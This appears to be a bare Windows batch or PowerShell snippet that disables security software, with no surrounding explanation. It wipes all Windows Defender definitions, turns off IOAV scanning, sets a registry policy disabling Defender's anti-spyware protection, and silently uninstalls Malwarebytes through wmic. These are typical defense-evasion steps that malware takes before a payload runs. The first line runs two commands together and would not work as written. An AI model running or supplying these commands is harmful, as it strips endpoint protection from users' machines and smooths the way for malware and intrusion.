"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware  /t REG_DWORD /d 1 /f 
wmic product where "name like 'Malwarebytes%%'"  call uninstall /nointeractive 
wmic product where "name like '%Malwarebytes%%'"  call uninstall /nointeractive